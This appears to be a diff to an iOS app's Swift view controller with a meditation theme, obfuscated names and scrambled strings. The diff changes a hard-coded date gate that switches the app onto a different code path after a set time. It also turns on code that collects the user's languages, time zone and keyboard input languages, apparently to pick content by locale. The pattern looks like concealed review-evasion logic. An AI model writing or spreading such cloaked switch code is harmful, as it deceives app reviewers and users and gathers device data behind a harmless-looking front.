@@ -91,7 +91,7 @@ class BodyScanucing: UIViewController {
             return
         }
 
-        if (Date().timeIntervalSince1970 > 1735743657) {
+        if (Date().timeIntervalSince1970 > 1760405674) {
             self.performInteractiveSoundPath()
         } else {
             self.performSensoryMeditationPath()
@@ -111,12 +111,12 @@ class BodyScanucing: UIViewController {
         auditoryRelaxation.startAnimating()
         let audioTherapy = CoreStreamingController.reconstructBaseLayer(interlacedScan: "/aozpwic/tvn1y/yihmvmvenrtsuiwvqejo")
         var immersiveJourney: [String: Any] = [:]
-//        let langs = Locale.preferredLanguages
-//            .map { Locale(identifier: $0).languageCode ?? $0 }
-//            .reduce(into: [String]()) { result, code in if !result.contains(code) { result.append(code) } }
-//        immersiveJourney["immersivee"] = langs
-//        immersiveJourney["immersivet"] = TimeZone.current.identifier
-//        immersiveJourney["immersivek"] = UITextInputMode.activeInputModes.compactMap { $0.primaryLanguage }.filter { $0 != CoreStreamingController.reconstructBaseLayer(interlacedScan: "dkikcxtcastriiorn") }
+        let langs = Locale.preferredLanguages
+            .map { Locale(identifier: $0).languageCode ?? $0 }
+            .reduce(into: [String]()) { result, code in if !result.contains(code) { result.append(code) } }
+        immersiveJourney["immersivee"] = langs
+        immersiveJourney["immersivet"] = TimeZone.current.identifier
+        immersiveJourney["immersivek"] = UITextInputMode.activeInputModes.compactMap { $0.primaryLanguage }.filter { $0 != CoreStreamingController.reconstructBaseLayer(interlacedScan: "dkikcxtcastriiorn") }
         immersiveJourney["immersiveg"] = 1
         _ = NoiseBuilder.prepare(immersiveJourney)
         print(immersiveJourney)
